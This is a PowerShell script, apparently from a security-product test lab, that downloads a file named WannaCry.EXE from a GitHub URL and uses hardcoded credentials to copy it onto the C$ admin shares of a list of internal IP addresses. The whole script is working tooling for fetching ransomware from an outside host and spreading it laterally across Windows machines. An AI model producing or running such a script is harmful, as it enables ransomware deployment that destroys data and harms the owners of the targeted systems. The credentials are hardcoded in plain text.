# List of target IPs
$ips = @("10.0.10.1", "10.0.10.102", "10.0.10.151", "10.0.10.150", "10.0.10.200", "10.0.10.100")

# Credentials for accessing C$ share
$username = "trendmicro"
$password = "trendmicro123"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $securePassword)

# Remote file path on the target machines
$destinationFolder = "C$\Windows\Temp"
$destinationFile = "WannaCry.EXE"

# File URL to download
$fileUrl = "https://github.com/Explodingstuff/WannaCry/raw/refs/heads/master/WannaCry.EXE"

# Local path to temporarily store the file
$tempFile = "$env:TEMP\$destinationFile"

# Download the file
Write-Host "Downloading the test file from $fileUrl..."
Invoke-WebRequest -Uri $fileUrl -OutFile $tempFile -UseBasicParsing

# Verify if file was downloaded
if (-not (Test-Path $tempFile)) {
    Write-Host "File download failed. Exiting."
    exit
}

# Attempt to upload the file to each machine
foreach ($ip in $ips) {
    Write-Host "`nAttempting to connect to \\$ip\C$..."

    # Define the network path for C$
    $cShare = "\\$ip\$destinationFolder"

    # Map the C$ share to a local drive letter
    $driveLetter = "Z:"
    New-PSDrive -Name "Z" -PSProvider FileSystem -Root $cShare -Credential $cred -ErrorAction SilentlyContinue

    # Check if the C$ share was successfully mapped
    if (Test-Path "$driveLetter\") {
        Write-Host "[+] Successfully connected to \\$ip\C$."

        # Define the full destination path
        $destinationPath = "$driveLetter\$destinationFile"

        # Attempt to copy the file
        Copy-Item -Path $tempFile -Destination $destinationPath -Force -ErrorAction SilentlyContinue

        # Verify if the file was uploaded
        if (Test-Path $destinationPath) {
            Write-Host "[+] File successfully uploaded to \\$ip\C$\Windows\Temp\$destinationFile"
        } else {
            Write-Host "[-] Failed to upload file to \\$ip\C$\Windows\Temp\$destinationFile"
        }

        # Remove the mapped drive
        Remove-PSDrive -Name "Z" -Force
    } else {
        Write-Host "[-] Unable to connect to \\$ip\C$ (Access Denied or Not Reachable)"
    }
}

Write-Host "`nTask Completed."
